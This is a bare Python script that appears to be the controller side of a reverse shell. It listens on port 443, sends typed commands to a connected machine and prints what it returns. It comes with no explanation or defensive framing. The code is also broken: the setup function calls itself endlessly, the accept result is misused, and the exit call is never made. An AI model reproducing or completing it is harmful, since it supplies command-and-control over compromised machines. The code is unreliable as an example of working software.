import socket, os, sys
def socketCreate():
    host = ''
    port = 443
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socketCreate()
    s.bind((host,port))
    s.listen(1)
    conn = s.accept()
    while 1:
        cmd = input('>')
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit
        command = conn.send(cmd)
        result = conn.recv(16834)
        print(result)
            
